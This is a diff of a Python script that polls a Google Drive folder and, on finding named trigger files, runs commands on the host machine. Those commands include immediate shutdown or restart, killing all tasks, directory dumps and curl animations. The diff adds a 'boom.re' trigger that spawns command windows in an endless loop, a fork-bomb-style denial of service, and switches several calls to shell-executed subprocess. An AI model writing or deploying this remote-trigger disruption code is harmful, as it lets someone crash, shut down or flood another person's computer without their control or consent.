@@ -64,26 +64,30 @@ def handle_file(service, file):
     if filename == 'hello.re':
         print("偵測到 hello.re，開啟記事本！")
         subprocess.run(["notepad.exe"])
+    
+    elif filename == 'boom.re':
+        print("偵測到 boom.re，開啟 cmd 並執行 color a + echo boom！")
+        while True:
+            subprocess.run('start cmd /k', shell=True)
 
     elif filename == 'rick.re':
         print("偵測到 rick.re，準備 rick 他！")
-        os.system('start cmd /k "curl ascii.live/rick')
+        subprocess.run('start cmd /k "curl ascii.live/rick')
 
     elif filename == 'shutdown.re':
         print("偵測到 shutdown.re，將關閉主機...")
-        os.system("shutdown /s /t 0", shell=True)
+        subprocess.run('start cmd /c "shutdown /s /t 0"', shell=True)
 
     elif filename == 'restart.re':
         print("偵測到 restart.re，將重啟主機...")
-        os.system("shutdown /r /t 0", shell=True)
+        subprocess.run('start cmd /c "shutdown /r /t 0"', shell=True)
 
     elif filename == 'dir.re':
         print("偵測到 dir.re，開啟 cmd 並執行 color c + dir /s")
-        subprocess.run('start cmd /k "color a && cd /d c: && dir/s && exit"', shell=True)
+        subprocess.run('start cmd /c "color a && cd /d c: && dir/s"', shell=True)
 
     elif filename == 'parrot.re':
         print("偵測到 parrot.re，開啟 cmd 並執行 curl parrot.live")
-
         subprocess.run('start cmd /k "curl parrot.live"', shell=True)
     
     elif filename == 'killAllTask.re':
@@ -95,10 +99,11 @@ def handle_file(service, file):
                 pass
 
     service.files().delete(fileId=file_id).execute()
+    
     print(f"已刪除檔案：{filename}")
 
 def check_and_act(service, folder_id):
-    query = f"('{folder_id}' in parents) and (name='hello.re' or name='rick.re' or name='shutdown.re' or name='restart.re' or name='dir.re' or name='killAllTask.re' or name='parrot.re')"
+    query = f"('{folder_id}' in parents) and (name='hello.re' or name='rick.re' or name='shutdown.re' or name='restart.re' or name='dir.re' or name='killAllTask.re' or name='parrot.re' or name = 'boom.re')"
     results = service.files().list(
         q=query,
         spaces='drive',
